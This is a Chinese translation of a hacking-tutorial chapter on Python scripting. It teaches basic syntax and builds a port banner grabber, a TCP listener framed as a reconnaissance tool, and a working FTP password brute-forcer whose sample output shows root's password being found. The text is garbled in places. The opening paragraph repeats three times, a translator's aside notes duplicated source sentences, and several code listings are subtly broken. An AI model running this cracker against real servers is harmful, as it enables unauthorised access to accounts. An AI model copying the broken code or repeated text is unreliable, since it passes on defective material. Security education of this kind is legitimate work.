  \n### 开始 Python 脚本编写\n\n现在你已经知道如何在 Python 中安装模块，我想介绍 Python 的一些基本概念和术语，然后是基础语法。之后，你将编写一些对你有用的脚本。\n\
  \n现在你已经知道如何在 Python 中安装模块，我想介绍 Python 的一些基本概念和术语，然后是基础语法。之后，你将编写一些对你有用的脚本。\n\n现在你已经知道如何在\
  \ Python 中安装模块，我想介绍 Python 的一些基本概念和术语，然后是基础语法。之后，你将编写一些对你有用的脚本。\n\n集成开发环境（或 IDE）是可用的。PyCharm\
  \ 是一个极好的工具，可以帮助你的开发。目前，我们将使用像 Leafpad 这样的基础编辑器来保持简单。\n\n请注意，学习任何编程语言都需要时间切大量的努力。请对自己耐心一点——尝试掌握我提供的每个小脚本。\n\
  \n**Python 中的格式化**\n\nPython 与其他一些脚本语言的区别之一是，格式化在 Python 中至关重要。Python 解释器使用格式化来确定代码如何分组。\n\
  \n如果你有一组以双缩进开始的代码行（例如），你必须在整个块中保持双缩进的一致，以便 Python 才能识别出这些代码行属于整体。这与其他编程语言中的脚本不同，在其他语言中，格式化是可选的格实践，但不是强制的。\n\
  \n### 变量\n\n现在来看 Python 中一些更实际的概念。变量是编程中最基础的数据类型之一，你之前在第 8 章的 bash 脚本中遇到过它。简单来说，变量是一个与特定值相关的名称，每当你在程序中使用该名称时，它都会调用关联的值。\n\
  \n它的工作原理是变量名指向存储在内存位置的数据，该位置可能包含任何类型的值，例如整数、实数、字符串、浮点数、布尔（真或假语句）、列表或字典。我们将在本章中简要介绍所有这些。\n\
  \n为了熟悉基础，让我们在 Leafpad 中创建一个简单的脚本，如列表 17-1 所示，并保存为 `hackers-arise_greetings.py`：\n\
  \n```\n#! /usr/bin/python3\n\nname=\"OccupyTheWeb\"\n\nprint (\"Greetings to \"\
  \ + name + \" from Hackers-Arise. The Best Place to Learn Hacking!)\n```\n\n*列表\
  \ 17-1：你的第一个 Python 程序*\n\n\n\n\n第一行简单地告诉系统，你希望它使用 `Python` 解释器来运行此程序，而不是任何其他语言。第二行定义了一个名为\
  \ `name` 的变量并给它赋值了一个值（在这种情况下为 `\"OccupyTheWeb\"`）。你应该将此值更改为你自己的名字。该变量的值处于 `string`\
  \ 字符数据格式中，这意味着内容被包含在引号中，并被视为文本。你也可以在字符串中放入数字，它们会被视为文本，这意味着你无法在数值计算中使用它们。\n\n第三行创建了一个\
  \ `print()` 语句，将 `Greetings to` 与 `name` 变量中的值连接起来，随后是来自 `Hackers-Arise. The Best\
  \ Place to Learn Hacking!` 的文本。`print()` 语句会将你传递给括号内的任何内容显示在你的屏幕上。\n\n现在，在运行此脚本之前，你需要赋予自己执行它的权限。我们需要使用\
  \ `chmod` 命令来实现这一点。（有关 Linux 权限的更多信息，请参阅第 5 章）。\n\n```bash\nkali >chmod 755 hackers-arise_greetings.py\n\
  ```\n\n正如你在第 8 章中编写 bash 脚本的那样，要执行你的脚本，要在脚本名称前加上点和正斜杠。出于安全考虑，当前目录不在 `$PATH` 变量中，因此我们需要在脚本名前加上\
  \ `./`，告诉系统在当前目录查找文件名并执行它。\n\n要运行这个特定的脚本，请输入以下内容：\n\n```bash\nkali >./hackers-arise_greetings.py\n\
  ```\n\nGreetings to OccupyTheWeb from Hackers-Arise. The Best Place to Learn Hacking!\n\
  \n在 Python 中，每个变量类型都被视为一个 `class`。`class` 是一种用于创建对象的模板。更多信息请参阅第 192 页上的“面向对象编程 (OOP)”。在接下来的脚本中，我尝试演示了几类变量。变量包含的不仅仅是字符串。列表\
  \ 17-2 显示了一些包含不同数据类型的变量。\n\n```python\n#! /usr/bin/python3\n\nHackersAriseStringVariable\
  \ = \"Hackers-Arise Is the Best Place to Learn\n\nHacking\"\n\nHackersAriseIntegerVariable\
  \ = 12\n\nHackersAriseFloatingPointVariable = 3.1415\n\nHackersAriseList = [1,2,3,4,5,6]\n\
  \nHackersAriseDictionary = {'name' : 'OccupyTheWeb', 'value' : 27}\n\nprint (HackersAriseStringVariable)\n\
  \nprint (HackersAriseIntegerVariable)\n\nprint (HackersAriseFloatingPointVariable)\n\
  ```\n\n*列表 17-2：与变量相关的系列数据结构*\n\n这创建了五个包含不同数据类型的变量：字符串，视为文本；整数，一种不带小数的数字类型，可以用于数值运算；浮点数，一种带有小数的数字类型，也可以用于数值运算；列表（list），一组存储在一起的值；以及字典（dictionary），一种无序的数据集，其中每个值都与一个键（key）相关，这意味着字典中的每个值都有一个唯一的标识键。这在你想要通过键名来引用或更改值时非常有用。例如，假设你有一个配置如下的字典\
  \ `fruit_color`：\n\n```python\nfruit_color = {'apple' : 'red', 'grape' : 'green',\
  \ orange : 'orange'}\n```\n\n如果你在脚本稍后想要获取 `grape` 的 `fruit_color`，只需通过其键调用即可：\n\n\
  ```python\nprint (fruit_color['grape'])\n```\n\n你也可以更改特定键的值；例如，在这里我们更改苹果的颜色：\n\n\
  ```python\nfruit_color['apple'] = 'green'\n```\n\n我们将在本章晚些部分详细讨论列表和字典。\n\n在任何文本编辑器中创建此脚本，将其保存为\
  \ `secondpythonscript.py`，然后赋予自己执行它的权限，如下：\n\n```bash\nkali >chmod 755 secondpythonscript.py\n\
  ```\n\n当我们运行此脚本时，它会打印字符串变量、整数变量和浮点数变量的值，如下：\n\n```bash\nkali >./secondpythonscript.py\n\
  ```\n\nHackers-Arise Is The Best Place to Learn Hacking\n\n12\n\n3.1415\n\n**注意**\n\
  \n*在 Python 中，不需要像在其他某些编程语言中那样在赋值之前声明变量。*\n\n### 注释\n\n与任何其他编程和脚本语言一样，Python 具有添加注释的能力。注释仅仅是你代码的一部分——单词、句子甚至段落——用于解释代码的意图。Python\
  \ 会识别代码中的注释并忽略它们。虽然注释不是必须的，但当你两年后回到代码并记不起它应该做什么时，它们将是非常有帮助的。程序员经常使用注释来解释某个代码块的作用，或者解释选择特定编码方法背后的逻辑。\n\
  \n解释器会忽略注释。这意味着任何指定为注释的行都会被解释器跳过，解释器会继续执行直到遇到有效的代码行。Python 使用 `#` 符号来指定单行注释的开始。如果你想写多行注释，可以在开头和结尾使用三个双引号（`\"\
  \"\"`）。正如在下面的脚本所示，我在 `hackers-arise_greetings.py` 中添加了多行注释。\n\n```python\n#! /usr/bin/python3\n\
  \n\"\"\"\n这是我第一个带有注释的 Python 脚本。注释用于帮助我们解释代码。\n在这种情况下，这个简单的脚本为用户创建了一个问候语。\n\"\"\"\
  \n\nname = \"OccupyTheWeb\"\n\nprint (\"Greetings to \"+name+\" from Hackers-Arise.\
  \ The Best Place to Learn Hacking!\")\n```\n\n当我们执行脚本时，与上次相比没有变化，正如你在这里看到的：\n\n\
  ```bash\nkali >./hackers-arise_greetings.py\n```\n\nGreetings to OccupyTheWeb from\
  \ Hackers-Arise. The Best Place to Learn Hacking!\n\n### 函数\n\nPython 中的函数是执行特定操作的代码段。例如，你之前使用的\
  \ `print()` 语句就是一个显示你传递给它的任何值的函数。Python 许多许多你可以立即导入并使用的内置函数。其中大多数存在于你默认的 Python\
  \ 安装中。让我们来看看你可用的数千万个函数中的少数几个：\n\n*   `exit()` 退出程序。\n*   `float()` 将其参数作为浮点数返回。例如，`float(1)`\
  \ 将返回 `1.0`。\n*   `help()` 显示由其参数指定的对象的帮助。\n*   `int()` 返回其参数的整数部分（截断）。\n*   `len()`\
  \ 返回列表或字典中的元素个数。\n*   `max()` 返回其参数（一个列表）中的最大值。\n*   `open()` 根据参数指定的模式打开文件。\n*\
  \   `range()` 返回两个参数指定值之间的整数列表。\n*   `sorted()` 取列表作为参数并按顺序返回。\n*   `type()` 返回其参数的类型（例如，`int`、`file`、`method`、`function`）。\n\
  \n你也可以创建自己的函数来执行自定义任务。由于语言中内置了许多函数，在费自己构建之前，检查函数是否已经存在总是值得的。有很多方法可以进行这种检查。一种是查看*[`docs.python.org`](https://docs.python.org)*\
  \ 官方 Python 文档。选择你正在使用的版本，然后选择**Library Reference**（库引用）。\n\n\n\n\n\n许多编程语言使用数组作为存储多个独立对象的方式。`array`\
  \ 是一个值列表，可以通过在列表中某个特定值的位置（即索引，index）来引用该值，并以各种方式对该值进行检索、删除、替换或处理。需要注意的是，Python 与许多其他编程环境一样，其索引从\
  \ 0 开始计数，因此列表中的第一个元素是索引 0，第二个是索引 1，第三个是索引 2，以此此类推。例如，如果我们想访问数组中的第三个值，可以使用 `array[2]`。在\
  \ Python 中，有几种数组的实现方式，但可能最常见的实现方式被称为 `lists`（列表）。\n\nPython 中的列表是*可迭代的*（iterable`），这意味着当你运行完整个列表时，列表可以提供连续的元素（请参见第\
  \ 198 页上的“循环”）。这非常有用，因为很多时候当我们使用列表时，我们是在遍历它们来查找某个特定值、逐个打印值，或者从一个列表中取出值并放入另一个列表中。\n\
  \n所以，让我们想象一下我们需要显示列表 17-2 中列表 `HackersAriseList` 的第四个元素。我们可以通过调用列表名称 `HackersAriseList`，后跟方括号内我们要访问的元素索引来访问并打印该元素。\n\
  \n为了测试这一点，请在你的 `secondpythonscript.py` 脚本底部添加以下行，以打印 `HackersAriseList` 中索引为 3 的元素：\n\
  \n```\n--snip--\n\nprint (HackersAriseStringVariable)\n\nprint (HackersAriseIntegerVariable)\n\
  \nprint (HackersAriseFloatingPointVariable)\n\nprint (HackersAriseList[3])\n```\n\
  \n当我们再次运行此脚本时，我们可以看到新的 print 语句与其他输出一起打印了 4：\n\n```\nkali >./secondpythonscript.py\n\
  Hackers-Arise Is the Best Place to Learn Hacking\n12\n3.1415\n4\n```\n\n### 模块 (Modules)\n\
  \n`module`（模块）只是保存到独立文件中的代码段，这样你就可以在程序中多次使用它，而无需重新输入一遍。如果你想使用一个模块或模块中的任何代码，你需要 `import`（导入）它。正如之前讨论的，使用标准模块和第三方模块是让\
  \ Python 对黑客变得如此强大的关键特征之一。如果我们想使用之前安装的 `nmap` 模块，我们会在脚本中添加以下行：\n\n```\nimport nmap\n\
  ```\n\n在本章的后半部分，我们将使用两个非常实用的模块：`socket` 和 `ftplib`。\n\n### 面向对象编程 (OOP)\n\n在深入研究\
  \ Python 之前，可能花几分钟时间讨论一下面向对象编程（OOP）的概念是值得的。Python 与如今的大多数编程语言（例如 C++、Java 和 Ruby\
  \ 等）一样，都遵循 OOP 模型。\n\n图 17-2 显示了 OOP 背后的基本概念：语言的主要工具是 `object`（对象），它具有属性（attributes）和状态的形式的形式，以及作为由对象执行或对对象执行的操作的方法（methods）。\n\
  \n![image](img/f0193-01.jpg)\n\n*图 17-2：面向对象编程插图*\n\n基于 OOP 的编程语言的设计理念是创建像现实世界中的事物一样的对象。例如，汽车是一个对象，它具有属性，如轮子、颜色、尺寸和引擎类型；它还拥有方法，即汽车采取的操作，如加速和锁门。从人类自然语言的角度来看，对象是一个名词，属性是一个形容词，而方法通常是一个动词。\n\
  \n对象是 `class`（类）的成员，`class` 本质上是创建具有共享初始变量、属性和方法的对象的模板。例如，假设我们有一个名为 `cars` 的类；我们的汽车（一辆宝马）就是\
  \ `cars` 类的成员。该类还包含其他对象/汽车，如梅赛德斯和奥迪，如图 17-3 所示。\n\n![image](img/f0193-02.jpg)\n\n\
  *图 17-3：OOP 类和对象*\n\n类也可以有子类（subclasses）。我们的汽车类有一个宝马子类，该子类的的一个对象可能是 320i 型。\n\n\
  每个对象都将属性（品牌、型号、年份和颜色）和方法（启动、驾驶和停车），如图 17-4 所示。\n\n![image](img/f0193-03.jpg)\n\n\
  *图 17-4：属性与方法*\n\n在 OOP 语言中，对象具有属性（品牌、型号、年份和颜色）和方法（启动、驾驶和停车）。\n\n这些 OOP 概念对于理解 Python\
  \ 工作至关重要，你将在接后的章节中看到它们。\n\n### Python 中的网络通信 (Network Communications in Python)\n\
  \n在进入更多 Python 概念之前，让我们利用目前所学的知识编写一些网络连接脚本。\n\n### 构建 TCP 客户端\n\n我们在 Python 中使用\
  \ `socket` 模块创建一个网络连接。正如我们所提到的，`socket` 提供了节点之间通信的方式。通常一个是服务器，一个是客户端。\n\n首先，我们导入\
  \ `socket` 模块以便我们可以使用它的功能。\n\n```python\n#! /usr/bin/python3\nimport socket\n```\n\
  \n将此脚本保存为 `HackersAriseSSHBannerGrab.py`，然后使用 `chmod` 命令更改其权限以便你可以执行它。\n\n让我们运行此脚本连接到另一个\
  \ Linux 系统（你可以使用 Ubuntu 系统，甚至是另一个 Kali 系统）的 22 端口。如果 SSH 在该端口上运行，我们应该能够将 banner\
  \ 读取到 answer 变量并将其打印到屏幕上，如下：\n\n```python\n#! /usr/bin/python3\nimport socket\n\
  s = socket.socket()\ns.connect((\"192.168.1.101\", 22))\nanswer = s.recv(1024)\n\
  print (answer)\ns.close()\n```\n\n```\nSSH-2.0-OpenSSH_7.3p1 Debian-1\n```\n\n\n\
  \n\n我们刚刚创建了一个简单的横幅获取（banner-grabbing）Python 脚本！我们可以使用这个脚本来查找该 IP 地址和端口运行的是什么应用程序、版本和操作系统。这为黑客在攻击系统之前提供了关键信息。这本质上就是\
  \ `Shodan.io` 网站对地球上几乎每个 IP 地址所的工作，它负责分类并索引这些信息供我们搜索。\n\n## 创建 TCP 监听器\n\n我们刚刚创建了一个\
  \ TCP 客户端，它可以连接到另一个 TCP/IP 地址和端口，并监听正在传输的信息。该 socket 也可以用于创建一个 TCP 监听器，用于监听来自外部到你服务器的连接。让我们接下来尝试这样做。\n\
  \n在列表 17-4 所示的 Python 脚本中，你将在系统的任意端口上创建一个 socket，当有人连接到该 socket 时，它会收集有关连接者系统的关键信息。输入脚本并将其保存为\
  \ `tcp_server.py`。确保使用 `chmod` 为自己赋予执行权限。\n\n```python\n#! /usr/bin/python3\n\n\
  import socket\n\nTCP_IP = \"192.168.181.190\"\nTCP_PORT = 6996\nBUFFER_SIZE = 100\n\
  \ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind((TCP_IP, TCP_PORT))\n\
  s.listen (1)\nconn, addr = s.accept()\nprint ('Connection address: ', addr )\nwhile\
  \ 1:\n    data=conn.recv(BUFFER_SIZE)\n    if not data:break\n    print (\"Received\
  \ data: \", data)\n    conn.send(data)  #echo\nconn.close\n```\n*列表 17-4: 一个 TCP\
  \ 监听 Python 脚本*\n\n我们声明希望脚本使用 Python 解释器运行，然后像之前一样导入 `socket` 模块，以便使用它的功能。我们定义了变量来存储\
  \ TCP/IP 地址、要监听的端口以及我们想要从连接系统中捕获的数据缓冲区大小 ➊。\n\n我们定义 socket ➋ 并使用刚刚创建的变量将 socket\
  \ 绑定到 IP 地址和端口 ➌。我们告诉 socket 使用 `socket` 库中的 `listen()` 方法进行监听 ➍。\n\n然后我们使用 `socket`\
  \ 库的 `accept` 方法捕获连接系统的 IP 地址和端口，并将该信息打印到屏幕上供用户查看 ➎。注意这里的 `while 1:` 语法；我们将在本章稍后部分详细讨论，但现在只需知道它被用于无限期运行其后的缩进代码，这意味着\
  \ Python 会一直检查数据，直到程序停止。\n\n最后，我们将来自连接系统的信息放入缓冲区，打印出来，然后关闭连接。\n\n现在，转到网络上的另一台计算机，使用浏览器连接到我们脚本中指定的\
  \ 6996 端口。运行 `tcp_server.py` 脚本，你应该应该能够连接并收集有关该系统的关键信息，包括连接系统的 IP 地址和端口，如下所示：\n\n\
  ```bash\nkali >./tcp_server.py\nConnection Address: ('192.168.181.190', 45368)\n\
  Received data: Get /HTTP/1.1\nHost:192.168.181.190:6996\nUser -Agent:Mozilla/5.0\
  \ (X11; Linux x86_64; rv:45.0) Gec\n--snip---\n```\n\n这是黑客在决定利用漏洞（exploit）之前需要收集的关键信息。漏洞利用（或攻击）取决于特定的操作系统、应用程序甚至所使用的语言，因此黑客在继续之前需要尽可能多地了解目标的信息。这种在攻击之前收集信息的行为通常被称为\
  \ `reconnaissance`（侦察）。你刚刚开发的这个工具将为潜在目标收集关键侦察信息，与流行的黑客工具 `p0F` 非常相似。\n\n## 字典、循环和控制语句\n\
  \n让我们继续扩展你对 Python 的理解，然后利用你目前所学的所有知识为 FTP 服务器构建一个密码破解器。\n\n### 字典\n\n字典以无序对的形式存储信息，每对包含一个键（key）和一个关联的值（value）。我们可以使用字典来存储项目列表，并为每个项目分配一个标签，这样我们就可以单独使用和引用该项目。我们可能会使用字典来存储用户\
  \ ID 及其关联名称，或者存储与特定主机相关的已知漏洞。Python 中的字典作用类似于其他语言中的关联数组。\n\n和列表一样，字典是可迭代的，这意味着我们使用\
  \ `for` 语句等控制结构遍历整个字典，将字典的每个元素分配给变量，直到到达字典结束。\n\n除其他外，你可能会在构建密码破解器时使用这种结构，遍历字典中存储的每个密码，直到某个密码有效或破解器到达字典结束。\n\
  \n创建字典的语法如下：\n\n```python\ndict = {key1:value1, key2:value2}\n```\n\n注意，对于字典，你使用大括号并用逗号分隔项。你可以包含任意数量的键值对。\n\
  \n### 控制语句\n\n控制语句允许你的代码根据某些条件做出判断。Python 中有许多控制流的方法。让我们来看看其中一些结构。\n\n### if 语句\n\
  \nPython 中的 `if` 结构与其他许多语言一样，用于检查条件是否为真。语法如下：\n\n```python\nif conditional expression:\n\
  \    如果表达式为真则运行此代码\n```\n\n`if` 语句包含一个条件，例如 `variable < 10`。如果满足条件，表达式为真，则执行随后的代码（即控制块）。如果语句为假，则跳过控制块。\n\
  \n在 Python 中，控制块必须缩进。这种缩进向解释器标识了控制块。下一个没有缩进的语句位于控制块之外，这就是 Python 知道在条件不满足时跳到哪里。\n\
  \n### if...else\n\nPython 中的 `if...else` 结构如下：\n\n```python\nif conditional expression:\n\
  \    当条件满足时运行此代码\nelse:\n    当条件不满足时运行此代码\n```\n\n与之前，解释器首先检查 `if` 表达式中的条件。如果为真，解释器执行控制块中的语句。如果条件语句为假，则执行\
  \ `else` 语句后的控制块。\n\n例如，这里我们有一段代码检查用户 ID 的值；如果是 0（Linux 中的 root 用户始终是 0），那么我们就打印“你是\
  \ root 用户”的消息。否则，如果是任何其他值，我们就打印“你不是 root 用户”。\n\n```python\nif userid == 0:\n  \
  \  print (\"You are root user\")\nelse:\n    print (\"You are NOT root user\")\n\
  ```\n\n### 循环\n\n循环是 Python 中另一个非常有用的结构。循环允许程序员根据值或条件重复执行代码块。最常用的是 `while` 和 `for`。\n\
  \n### while 循环\n\n`while` 循环评估一个布尔表达式（一个只能求值为真或假的表达式），并在表达式为真的情况下继续执行。例如，我们可以创建一个代码片段，打印从\
  \ 1 到 10 的每个数字然后退出循环，如下：\n\n```python\ncount = 1\nwhile (count <= 10):\n    print\
  \ (count)\n    count += 1\n```\n\n该缩进的控制块在条件为真的范围内一直运行。\n\n\n\n`for` 循环可以在每次循环时将列表、字符串、字典或其他迭代结构中的值赋值给索引变量，从而允许我们按顺序使用结构中的每个项目。例如，我们可以使用\
  \ `for` 循环尝试密码，直到找到匹配项为止，如下所示：\n\n```python\nfor password in passwords:\n    attempt\
  \ = connect (username, password)\n    if attempt == \"230\"\n        print (\"Password\
  \ found: \" + password)\n        sys.exit (0)\n```\n\n在此代码段中，我们创建了一个 `for` 语句，它会遍历我们提供的密码列表，并尝试使用用户名和密码进行连接。如果连接尝试收到了\
  \ `230` 代码（这是连接成功的状态代码），程序将打印“Password found:”然后打印密码。随后程序退出。如果没有收到 `230`，它将继续遍历剩余的每个密码，直到收到\
  \ `230` 或耗尽密码列表。\n\n## 改进我们的黑客脚本\n\n现在我们已经对 Python 循环结构和条件语句有了一些背景知识，让我们回到横幅抓取（banner-grabbing）脚本并添加一些功能。\n\
  \n我们将添加一个想要抓取横幅的端口列表，而不仅仅是监听一个端口，然后使用 `for` 语句遍历列表。通过这种方式，我们可以搜索并抓取多个端口的横幅，并将它们显示在屏幕上。\n\
  \n首先，让我们创建一个列表并在其中放入额外的端口。打开 `HackersAriseSSHBannerGrab.py`，我们将从那里开始工作。Listing 17-5\
  \ 显示了完整代码。注意，灰色的行保持不变；黑色的行是你需要更改或添加的。我们将尝试抓取端口 21 (ftp)、22 (ssh)、25 (smtp) 和 3306\
  \ (mysql) 的横幅。\n\n```python\n#! /usr/bin/python3\nimport socket\nPorts = [21,22,25,3306]\n\
  for i in range (0,4):\n    s = socket.socket()\n    Port = Port[i]\n    print ('This\
  \ Is the Banner for the Port')\n    print (Ports)\n    s.connect ((\"192.168.1.101\"\
  , Port))\n    answer = s.recv (1024)\n    print (answer)\n    s.close ()\n```\n\
  *Listing 17-5: 改进横幅抓取器*\n\n我们创建了一个名为 `Ports` 的列表 ➊ 并添加了四个元素，每个元素代表一个端口。然后我们创建一个\
  \ `for` 语句来遍历该列表四次，因为它有四个项目 ➋。\n\n记住，当你使用 `for` 循环时，与循环相关的代码必须在 `for` 语句下方缩进。\n\n\
  我们需要修改程序以反映在每次迭代中使用来自列表的变量。为了做到，我们创建了一个名为 `Port` 的变量，并在每次迭代中将其赋值为列表中的值 ➌。然后我们在连接\
  \ ➍中使用该变量。\n\n当解释器执行该语句时，它将尝试连接到 IP 地址上分配给变量的端口。\n\n现在，如果你在一个列出的所有端口已打开并启用的系统上运行此脚本，你应该看到类似\
  \ Listing 17-6 的内容。\n\n```bash\nkali >./HackersArisePortBannerGrab.py\nThis is the\
  \ Banner for the Port\n21\n220 (vsFTPd 2.3.4)\nThis Is the Banner for the Port\n\
  22\nSSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1\nThis Is the Banner for the Port\n25\n\
  220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\nThis Is the Banner for the\
  \ Port\n3306\n5.0.51a-3ubuntu5\n```\n*Listing 17-6: 端口横幅抓取的输出*\n\n注意，脚本发现端口 21 已开启并运行着\
  \ vsFTPd 2.3.4，端口 22 已开启并运行着 OpenSSH 4.7，端口 25 使用 Postfix，端口 3306 使用 MySQL 5.0.51a。\n\
  \n我们刚刚用 Python 成功构建了一个多端口横幅抓取工具，对目标系统进行侦察。该工具告诉我们端口上运行着什么服务以及该服务的版本！这是黑客在进行攻击所需的所需的信息。\n\
  \n## 异常与密码破解器\n\n你编写的任何代码都面临错误或异常的风险。在编程术语中，异常是指任何中断代码正常流流的现象——通常是由错误的代码或输入引起的错误。为了处理可能的错误，我们使用*异常处理*（exception\
  \ handling），这简单来说就是处理特定问题、显示错误信息、甚至使用异常进行决策的代码。在 Python 中，我们使用 `try/except` 结构来处理这些错误。\n\
  \n（注：原文后续部分存在大量重复的 \"In Python, we have the try/except structure to handle these\
  \ errors.\" 句子，已根据提供的逻辑对核心代码块部分进行了翻译。）\n\n在 Python 中，我们使用 `try/except` 结构来处理这些错误。\n\
  \n```python\n#! /usr/bin/python3\nimport ftplib\nserver = input(\"Server: \")\n\
  user = input(\"username: \")\nPasswordlist = input(\"Path to List: \")\ntry:\n \
  \   with open(Passwordlist, 'r') as pw:\n        for word in pw:\n            word\
  \ = word.strip('\\n')\n            try:\n                ftp = ftplib.FTP(server)\n\
  \                ftp.login(user, word)\n                print ('Success! The password\
  \ is ' + word)\n                break\n            except:\n                print('still\
  \ trying...')\nexcept:\n    print('Wordlist error')\n```\n*Listing 17-7: FTP 密码破解器*\n\
  \n\n\n\n```\nkali >./ftpcracker.py\n\nFTP Server: 192.168.1.101\n\nusername: root\n\
  \nPath to PasswordList >bigpasswordlist.txt\n\nstill trying...\n\nstill trying...\n\
  \nstill trying...\n\n--snip--\n\nSuccess! The password is toor\n\n如你所见，`ftpcracker.py`\
  \ 成功找到了用户 `root` 的密码并将其显示在屏幕上。\n\n## 总结\n\n为了超越“脚本小子”（script-kiddie）的阶段，黑客必须掌握一种脚本语言，Python\
  \ 因其多功能性和相对较小的学习曲线，通常是良好的首选。大多数黑客工具都是用 Python 编写的，包括 `sqlmap`、`scapy` 等。在这里，你学习了一些\
  \ Python 基础知识，可以用它们构建一些实用但简单的黑客工具，包括一个 banner 抓取工具和一个 FTP 密码破解器。想要学习更多 Python，我强烈推荐\
  \ Al Sweigart 编写的 No Starch Press 出版的优秀书籍 *Automate the Boring Stuff with Python*\
  \ (2015)。\n\n## 练习\n\n通过完成以下练习，尝试运用在本章中学到的技能：\n\n1. 从 列表 17-5 构建 SSH banner 抓取工具，然后对其进行编辑以对\
  \ 21 端口进行 banner 抓取。\n2. 不要将 IP 地址硬编码到脚本中，而是编辑你的 banner 抓取工具，提示用户输入 IP 地址。\n3. 编辑你的\
  \ `tcp_server.py`，提示用户输入要监听的端口。\n4. 在 列表 17-7 构建 FTPcracker，然后对其进行编辑，使用单词列表作为用户变量（类似于我们处理密码的方式），而不是提示用户输入。\n\
